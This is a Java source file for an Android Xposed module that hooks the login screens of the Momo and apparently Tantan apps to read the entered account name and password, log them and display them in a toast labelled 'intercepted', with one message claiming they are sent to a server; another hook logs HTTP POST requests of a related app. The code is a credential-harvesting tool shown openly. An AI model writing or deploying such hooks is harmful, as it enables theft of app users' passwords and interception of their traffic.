package company.lsn.com.hookmomo;

import android.app.Activity;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;

import java.lang.reflect.Field;
import java.util.Map;

import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage;


public class HookMoMo implements IXposedHookLoadPackage {


    @Override
    public void handleLoadPackage(final XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable {

//package        "com.immomo.momo"
//类        com.immomo.momo.account.activity.LoginActivity

        final String packageName = loadPackageParam.packageName;


        if ("com.immomo.molive".equals(packageName)) {

            XposedBridge.log("Hook HaNi" + packageName);

            hookHaNi(loadPackageParam.classLoader);


        }


    }


    private void hookMoMoLogin(ClassLoader classLoader) {


        XposedHelpers.findAndHookMethod("com.immomo.momo.account.activity.LoginActivity", classLoader

                , "onClick", View.class, new XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    }

                    @Override
                    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
//                        super.beforeHookedMethod(param);


                        Class clazz = param.thisObject.getClass();

                        XposedBridge.log("app类名" + clazz.getName());

                        // edittext 账号 u
                        // edittext 秘密 v
                        Field fieldAccount = clazz.getField("editAccount");

                        Field fieldPassword = clazz.getField("editPassword");

                        EditText editAccount = (EditText) fieldAccount.get(param.thisObject);

                        EditText editPassword = (EditText) fieldPassword.get(param.thisObject);

                        String account = editAccount.getText().toString();

                        String password = editPassword.getText().toString();

                        Toast.makeText((Activity) param.thisObject, "截获账号：" + account + "\n"
                                + "截获秘密：" + password, Toast.LENGTH_LONG).show();

                        XposedBridge.log("截获账号：" + account + "\n"
                                + "截获秘密：" + password);

                    }
                });

    }

    private void hookTTLogin(ClassLoader classLoader) {

        XposedHelpers.findAndHookMethod("com.p1.mobile.putong.ui.account.SignInAct", classLoader

                , "onPause", new XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    }

                    @Override
                    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
//                        super.beforeHookedMethod(param);


                        XposedBridge.log("Hook TT方法中");


                        EditText editPassword = (EditText) XposedHelpers.getObjectField(param.thisObject, "bic");
                        EditText editAccount = (EditText) XposedHelpers.getObjectField(param.thisObject, "bii");

                        Toast.makeText((Activity) param.thisObject, "劫持账号:" + editAccount.getText().toString() + "\n" + "劫持密码:" + editPassword.getText().toString() + "\n" + "并发送至服务器", Toast.LENGTH_LONG).show();

                        XposedBridge.log("劫持账号" + editAccount.getText().toString() + "\n" + "劫持密码" + editPassword.getText().toString());

                    }
                });

    }

    private void hookHaNi(ClassLoader classLoader) {

        XposedHelpers.findAndHookMethod("com.immomo.momo.sdk.http.HttpClient", classLoader

                , "doPost", String.class, Map.class, Map.class, new XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {

//                        XposedBridge.log("Hook 返回" + param.getResult());

                    }

                    @Override
                    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
//                        super.beforeHookedMethod(param);

                        XposedBridge.log("Hook 参数" + param.args[0]);

                    }
                });

    }


}
